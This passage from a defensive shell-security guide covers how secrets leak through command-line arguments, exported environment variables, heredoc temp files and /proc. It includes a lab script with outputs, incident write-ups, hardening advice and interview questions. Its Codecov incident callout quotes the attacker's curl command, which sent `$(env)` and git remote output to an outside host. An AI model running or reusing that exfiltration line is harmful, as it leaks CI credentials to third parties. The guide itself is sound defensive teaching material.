# secrets_demo.sh: exercises command-line, environment, stdin, and heredoc secret passing.
set -eu

mode="${1:-}"
probe="${2:-}"
secret="${3:-}"

case "$mode" in
  argv)
    "$probe" argv_check "$secret" --token="$secret"
    ;;
  stdin)
    printf '%s' "$secret" | "$probe" argv_check "$secret"
    printf '%s' "$secret" | "$probe" stdin_read
    ;;
  env_leak)
    SECRET_ENV="$secret"
    export SECRET_ENV
    "$probe" env_check SECRET_ENV
    ;;
  env_scrub)
    SECRET_ENV="$secret"
    export SECRET_ENV
    env -i PATH="$PATH" "$probe" env_check SECRET_ENV
    ;;
  heredoc_type)
    "$probe" stdin_type <<EOF
secret
EOF
    ;;
  *)
    printf 'unknown mode: %s\n' "$mode" >&2
    exit 1
    ;;
esac
```

Executing the lab driver under macOS `/bin/sh` (Bash 3.2.57) produces the following captured outputs (re-run on the macOS host, as of 2026-11):

```text
$ ./secrets_demo.sh argv "$PROBE" "top-secret-token"
found in argv

$ ./secrets_demo.sh stdin "$PROBE" "top-secret-token"
not in argv
stdin: top-secret-token

$ ./secrets_demo.sh env_leak "$PROBE" "top-secret-token"
env: top-secret-token

$ ./secrets_demo.sh env_scrub "$PROBE" "top-secret-token"
env: unset

$ ./secrets_demo.sh heredoc_type "$PROBE"
REGULAR_FILE size=7
```

In `argv` mode, the token is detected directly in `argv`.
In `stdin` mode, the token is completely absent from `argv` while arriving intact at the callee.
In `env_leak` mode, the exported variable passes into the child process environment.
In `env_scrub` mode, `env -i` strips the exported credential, rendering it unset in the callee.
In `heredoc_type` mode under macOS Bash 3.2, `fstat(0)` confirms that the here-document is backed by a physical temporary file (`REGULAR_FILE size=7`) rather than an anonymous memory pipe.
The same run under Bash 5.3.15 prints `PIPE_OR_FIFO`.

## Pitfalls

> [!warning] Passing credentials directly in command-line arguments (CWE-214)
> Trigger: Invoking a CLI utility with credentials embedded in flags, such as `mysql -p"$PASSWORD"`, `curl -u "user:$TOKEN"`, or `codeql --github-auth="$TOKEN"`.
> Symptom: Any concurrent process on the system reads the plaintext token via `ps aux`, `/proc/[pid]/cmdline`, or monitoring daemons; the token is captured in `auditd` system call records.
> Real Incident: In `CVE-2021-32638`, the GitHub CodeQL runner (for non-GitHub CI systems) and its documentation suggested passing the access token as `--github-auth TOKEN`, which "made the token visible to other processes on the same machine, for example in the output of the `ps` command", and further when CI logged `ps` output; releases from `codeql-bundle-20210304` deprecate `--github-auth` in favor of `--github-auth-stdin` or the `GITHUB_TOKEN` environment variable ([GHSA-g36v-2xff-pv5m](https://github.com/github/codeql-action/security/advisories/GHSA-g36v-2xff-pv5m)).
> Fix: Pass credentials via standard input (`printf '%s' "$TOKEN" | tool --stdin`) or read them from a permission-restricted configuration file (`chmod 0600`).

> [!warning] Leaking exported secrets through child process inheritance
> Trigger: Running `export API_KEY="sk_live_EXAMPLE-NOT-A-REAL-KEY"` in a build script or CI wrapper before invoking external tools, linters, or test runners.
> Symptom: Every subsequent program executed by the shell inherits `API_KEY` in its `environ` table; crashed utilities dump the key in core files, and third-party dependencies exfiltrate environment tables.
> Real Incident: In the Codecov Bash Uploader breach (altered from 2021-01-31, discovered 2021-04-01), an attacker used a Google Cloud Storage key extracted through a flaw in Codecov's Docker image build to modify the uploader script, adding `curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://IPADDRESS/upload/v2 || true`, which sent every exported variable in customers' CI environments to a third-party server ([Codecov security update](https://about.codecov.io/security-update/)).
> Fix: Use scoped prefix assignments (`API_KEY="$KEY" command`) or explicitly execute untrusted utilities with a sanitized environment (`env -i PATH="$PATH" utility`).

> [!warning] False security from `HISTCONTROL=ignorespace`
> Trigger: Relying on a leading whitespace character to keep passwords out of shell history while using tabs, multi-line compound commands, or terminal multiplexers.
> Symptom: Bash `check_history_control` checks only for literal ASCII space (0x20); leading tabs or indented lines within compound blocks (`{ ... }`, `if ... fi`) are saved directly to `~/.bash_history`.
> Real Incident: Numerous postmortems reveal developer API keys committed to dotfile repositories because `~/.bash_history` captured indented compound commands that the engineer believed were ignored.
> Fix: Disable interactive history completely during sensitive sessions (`set +o history`), use `HISTFILE=/dev/null`, or enforce a strict `zshaddhistory` filter hook.

> [!warning] Plaintext secret exposure in temporary files from here-documents
> Trigger: Using here-documents (`<<EOF`) or here-strings (`<<<"$SECRET"`) in Bash 5.0 and older (including default macOS `/bin/bash` 3.2), or passing heredocs larger than 64 KiB in modern Bash.
> Symptom: Bash writes the here-document payload to an unlinked physical temporary file in `$TMPDIR` (zsh does the same in every version measured, and mksh and posh keep the file linked in `/tmp` while the command runs); on non-tmpfs filesystems, the secret is written to physical disk blocks where it remains recoverable from unallocated flash or disk blocks.
> Fix: Stream secrets via anonymous pipes (`printf '%s' "$SECRET" | command`) rather than here-documents, or guarantee that `$TMPDIR` is mounted on an in-memory `tmpfs` file system.

> [!warning] In-process process title rewriting race conditions
> Trigger: Passing a secret in `argv` under the assumption that the callee program immediately calls `setproctitle()` or overwrites `argv[0]` with asterisks in `main()`.
> Symptom: The secret remains exposed in `/proc/[pid]/cmdline` throughout dynamic linker startup and runtime initialization, allowing automated pollers and kernel audit daemons to record it before user code executes.
> Fix: Never pass the secret in `argv`; design CLI utilities to accept sensitive tokens strictly through stdin, file descriptors, or protected configuration files.

> [!warning] Process substitution pipe file descriptor leakage
> Trigger: Passing credentials using process substitution `tool --config <(printf '%s' "$SECRET")` on a multi-user Linux host without `/proc` protection.
> Symptom: The construct creates an open file descriptor in the calling shell, visible as `/proc/[pid]/fd/<fd>`; another local process with identical UID permissions can reopen the descriptor from `/proc` and read unconsumed bytes from the pipe buffer.
> Fix: Run untrusted same-UID code under a different UID or in a separate PID and user namespace, or deliver the secret on stdin instead; `hidepid=2` blocks other UIDs only, because a process can normally see and ptrace-read the `/proc` entries of its own UID.

## Security and robustness

### 1. Zero-leak pipeline architecture

A distinguished engineer enforces an architectural invariant across all shell workflows: credentials never appear in `argv`, never remain in exported environment arrays, and never touch interactive history.

The standard execution pattern uses standard input streaming:
```sh
# Anti-pattern: exposes token in argv
vault read --token="$TOKEN" secret/data/app

# Hardened pattern: delivers token over private pipe
printf '%s' "$TOKEN" | vault login -method=token token=-
```

When multiple sensitive parameters are required, encode the payload as JSON or key-value pairs and deliver them over standard input:
```sh
printf '{"username":"%s","password":"%s"}\n' "$USER" "$PASS" | auth_tool --config-stdin
```

### 2. Environment scrubbing and execution isolation

When invoking compilers, test suites, or third-party linters, strip the execution environment down to an explicit allowlist using `env -i`:
```sh
run_isolated() {
  env -i \
    HOME="$HOME" \
    PATH="/usr/bin:/bin" \
    USER="$USER" \
    "$@"
}
```

If an individual utility requires a secret via an environment variable, use single-command scoping rather than exporting:
```sh
# Good: scoped strictly to this single execution
AWS_SECRET_ACCESS_KEY="$KEY" aws s3 cp s3://bucket/file .

# Bad: remains in shell environment for all subsequent commands
export AWS_SECRET_ACCESS_KEY="$KEY"
aws s3 cp s3://bucket/file .
```

### 3. Linux kernel hardening: `hidepid` and core dumps

To protect systems against cross-user `argv` inspection:
1. Mount the `/proc` filesystem with `hidepid=invisible` (`hidepid=2`):
```text
proc /proc proc defaults,hidepid=2,gid=proc-monitoring 0 0
```
This ensures that non-root users can only view their own process directories within `/proc`, preventing unprivileged local accounts from snooping on concurrent system processes.
2. Disable core dumps for processes handling secrets to ensure memory pages containing credentials are not written to crash files:
```sh
ulimit -c 0
```
In C wrappers, enforce `prctl(PR_SET_DUMPABLE, 0)` to prevent memory dumping and forbid unprivileged `ptrace` attachment.

### 4. Ephemeral session tokens over static credentials

Eliminate static long-lived credentials from shell environments entirely:
- In cloud environments, use instance identity services (AWS IMDSv2, GCP Instance Metadata) rather than storing static keys in environment variables.
- In CI/CD pipelines, use OpenID Connect (OIDC) federation to exchange short-lived tokens on demand.
- Use credential helpers (such as `docker-credential-helper` or HashiCorp Vault agent) that retrieve tokens dynamically via IPC rather than storing them in plain text shell variables.

## The principal's view

The shell is a language designed for process orchestration, not data containment.
By default, the Unix process model treats command-line arguments as public metadata and environment variables as inherited process configuration.
Every architectural decision regarding secrets in shell scripts must accept this foundational constraint: any credential placed in an argument string or exported environment variable crosses a privilege boundary.

A staff-plus engineer enforces the following organizational rules:
1. Ban CLI argument passwords at the linting and gate level.
Automated scanners (such as custom Semgrep rules and pre-commit hooks) must flag any CLI usage matching `-p*`, `--password*`, `--token*`, or `--secret*`; ShellCheck has no such rule (SC2086 and SC2248 concern quoting), so this needs a dedicated pattern check.
2. Restrict shell scripting to orchestration.
Shell scripts should invoke purpose-built tools that handle authentication internally.
When a workflow requires complex secret handling, token exchange, or cryptographic operations, replace the shell script with a compiled binary (in Go or Rust) that allocates secrets within `mlock()` memory regions, prevents core dumps via `PR_SET_DUMPABLE`, and zeroes memory immediately after use.
3. Treat continuous integration environments as untrusted execution domains.
Because CI runners frequently execute third-party actions, npm packages, and foreign build code, exporting global secrets to runner environments invites supply-chain exfiltration.
Secrets must be injected only into the specific step requiring them, preferably mounted as in-memory files on `tmpfs` mounts.

## Interview questions

> [!question] L5: Why is passing a password via `--password "$SECRET"` considered a security defect even on a server where only trusted developers have login accounts?
>
> > [!success]- Answer
> > The `execve` system call copies command-line arguments to the process stack, where the kernel exposes them world-readable via `/proc/[pid]/cmdline` with mode `0444`.
> > Any unprivileged process or background job running under any user account on the machine can read the plaintext password from `/proc` using standard process tools like `ps` or `pgrep`.
> > Furthermore, system auditing daemons such as `auditd` record the full argument list of every executed command in persistent audit logs on disk.
> > Even in single-tenant systems, argument strings leak into system crash logs, error reports, and monitoring agents.
> >
> > Follow-up: How should the CLI interface be redesigned to accept the secret securely?

> [!question] L5 (Predict-the-output): What appears in the history file after executing this Bash sequence under `HISTCONTROL=ignorespace`?
> ```sh
> set -o history
> HISTFILE=/tmp/test.hist
>  echo "alpha"
> \techo "beta"
> {
>   echo "gamma"
> }
> history -a "$HISTFILE"
> ```
>
> > [!success]- Answer
> > In an interactive Bash 5.2.37 fed these lines on stdin, the history file contains five entries: `set -o history`, `HISTFILE=/tmp/test.hist`, `echo "beta"`, `{   echo "gamma"; }`, and `history -a "$HISTFILE"` (measured in the shell matrix).
> > `echo "alpha"` is excluded because it begins with an ASCII space character (0x20), satisfying `HC_IGNSPACE`.
> > The tab line is saved because it begins with a tab character (0x09), which does not match the space check in `check_history_control`; the saved entry had lost its leading tab.
> > The compound block `{ ... }` is saved because `maybe_add_history` evaluates history control only on the first line, which lacked a space, and the default `cmdhist` option joins its three lines into one entry.
> > Every other line, including the `history -a` command itself, is saved because it does not start with a space.
> >
> > Follow-up: How can an interactive Bash session be configured to ignore all command lines matching a specific pattern?

> [!question] L6: How do `/proc/[pid]/cmdline` and `/proc/[pid]/environ` differ in kernel permission checks on Linux?
>
> > [!success]- Answer
> > In `fs/proc/base.c`, `/proc/[pid]/cmdline` is registered with mode `S_IRUGO` (0444), making it readable by all users without restriction unless the procfs `hidepid` mount option is active.
> > `/proc/[pid]/environ` is registered with mode `S_IRUSR` (0400), restricting filesystem read permissions to the process owner and root.
> > Opening `/proc/[pid]/environ` calls `environ_open`, which invokes `__mem_open` to enforce a `PTRACE_MODE_READ` capability check on the inspecting process.
> > This prevents non-root users from reading the environment of other users' processes, although any process running under the same UID can still read it.
> >
> > Follow-up: If a process drops privileges from root to an unprivileged UID, why might its own unprivileged user be unable to read its `/proc/[pid]/environ`?

> [!question] L6 (Debug-this-script): Identify the security flaws in this automated backup script:
> ```sh
> #!/bin/sh
> export BACKUP_KEY="$(cat /etc/backup.key)"
> ./run_backup.sh
> ./probe_health.sh
> cat <<EOF | openssl enc -aes-256-cbc -pass pass:"$BACKUP_KEY" -out /tmp/archive.enc
> $(tar -cf - /var/data)
> EOF
> ```
>
> > [!success]- Answer
> > The script exports `BACKUP_KEY` globally, leaking the decryption key into the environment of `probe_health.sh` and every other subsequently executed command.
> > In the `openssl` invocation, passing `-pass pass:"$BACKUP_KEY"` places the encryption key directly into `argv`, exposing it to `ps aux` and `auditd`.
> > Passing `$(tar -cf - /var/data)` inside a here-document buffers the entire archive in shell memory, corrupts it (command substitution strips trailing newlines, and bash, dash, and most other shells drop NUL bytes), and, in Bash 3.2, zsh, mksh, or any Bash with a payload over 64 KiB, writes it to a temporary file on disk.
> > The fix is to pass the key via a protected file or a dedicated file descriptor (`-pass file:/etc/backup.key` or `-pass fd:3`; not `-pass stdin`, because stdin carries the archive) and pipe tar directly to openssl: `tar -cf - /var/data | openssl enc -aes-256-cbc -pbkdf2 -pass file:/etc/backup.key -out /tmp/archive.enc`.
> >
> > Follow-up: How would you scrub the environment before invoking `probe_health.sh`?

> [!question] L6: Why is in-process process title rewriting (such as `argv[0]` overwriting or `setproctitle`) fundamentally insufficient for hiding secrets?
>
> > [!success]- Answer
> > In-process overwriting executes in user space after dynamic linking and C runtime initialization have completed.
> > The kernel exposes `argv` through `/proc/[pid]/cmdline` immediately upon `execve` success, creating an unavoidable race window before `main()` executes.
> > Any concurrent process polling the process table can capture the plaintext argument during this startup window.
> > Furthermore, kernel audit frameworks like `auditd` capture `execve` arguments at the system call boundary before any user-space code executes.
> >
> > Follow-up: What Linux kernel API allows updating `cmdline` pointers safely, and what capability does it require?

> [!question] L7: Compare the internal implementation, kernel objects, and security guarantees of process substitution `<(cmd)` between Linux and macOS.
>
> > [!success]- Answer
> > On Linux, modern Bash and zsh create an anonymous pipe via `pipe(2)`, move the file descriptor to a high number, and pass a descriptor path as the argument: Bash passes `/dev/fd/<fd>` (which maps to `/proc/self/fd/<fd>`), and zsh passes `/proc/self/fd/<fd>` directly.
> > The data exists purely in memory pipe buffers, but any process owned by the same UID can inspect `/proc/[pid]/fd` and reopen the pipe descriptor.
> > On macOS, Bash and zsh also use `pipe(2)` and `/dev/fd/<fd>` (`/dev/fd/63` and `/dev/fd/11` measured), where `/dev/fd` is provided by the kernel's descriptor filesystem under `/dev` rather than by `/proc`.
> > On Unix platforms without `/dev/fd`, Bash falls back to `mkfifo(0600)` in `$TMPDIR`, creating a named filesystem node that is unlinked after execution.
> > If a named FIFO is used, file permissions and directory security on `$TMPDIR` determine whether peer processes can attach to the stream.
> >
> > Follow-up: How would you implement zero-leak ephemeral file streaming on Linux without relying on `/dev/fd`?

> [!question] L7: Design a secret delivery architecture for a shared Kubernetes cluster running multi-tenant batch jobs that must invoke legacy CLI binaries.
>
> > [!success]- Answer
> > Mount a dedicated `emptyDir` backed by RAM (`medium: Memory`, a `tmpfs`) into the pod container, and give secret volumes strict file permissions (`defaultMode: 0400`); `emptyDir` itself has no mode field.
> > Utilize a Kubernetes secret volume or sidecar vault agent to materialize credentials directly into this memory-backed filesystem rather than setting environment variables in the pod specification.
> > Ensure the container entrypoint invokes the legacy CLI using stdin redirection (`tool --password-stdin < /dev/shm/secret.txt`) or a file descriptor.
> > Mount `/proc` with `hidepid=2` inside the container or node runtime to prevent sidecar or compromised container processes from reading peer `cmdline` files.
> > Enforce `securityContext.allowPrivilegeEscalation: false` and set core dump limits to zero (`ulimit -c 0`).
> >
> > Follow-up: How would you prevent a compromised batch process from reading `/proc/1/environ` inside the container namespace?

> [!question] L7: How should a staff engineer architect continuous integration pipelines to eliminate the risk of environment variable harvesting during build steps?
>
> > [!success]- Answer
> > Enforce a strict decoupling between pipeline orchestration secrets and build execution environments.
> > Never export production secrets globally in runner configuration blocks or shared `.env` files.
> > Run build and test steps inside sanitized container environments using `env -i` with an explicit allowlist of non-sensitive variables.
> > Utilize dynamic OIDC authentication to generate short-lived, task-scoped tokens rather than storing long-lived static API keys.
> > Require tools that need secrets to read them from authenticated sidecar proxies or dedicated FIFO streams rather than ambient environment variables.
> >
> > Follow-up: How does the 2021 Codecov supply-chain breach influence this architectural pattern?

## Related

Prerequisites: [[Dropping-Privileges]]

Next: [[Piped-Installers]]

See also: [[Shell-Threat-Model]], [[Temporary-File-Attacks]], [[BASH_ENV-and-ENV]], [[Sandboxing-Scripts]]

## Further reading

- POSIX.1-2024 `functions/exec.html`: Official specification of `execve` argument and environment handling.
- Linux kernel `fs/proc/base.c`: Implementation source for `/proc/[pid]/cmdline` (`proc_pid_cmdline_read`) and `/proc/[pid]/environ` (`environ_read`).
- Linux kernel `fs/binfmt_elf.c`: Implementation of ELF user stack setup and argument/environment placement (`create_elf_tables`).
- GNU Bash `bashhist.c`: Source code defining history control filtering (`check_history_control`) and line addition (`maybe_add_history`).
- MITRE CWE-214: Official definition of "Invocation of Process Using Visible Sensitive Information".
- National Vulnerability Database CVE-2021-32638: Security advisory detailing GitHub CodeQL runner credential exposure via CLI arguments.
- Codecov Security Update (April 2021): Postmortem documenting environment variable exfiltration via modified CI bash uploader.
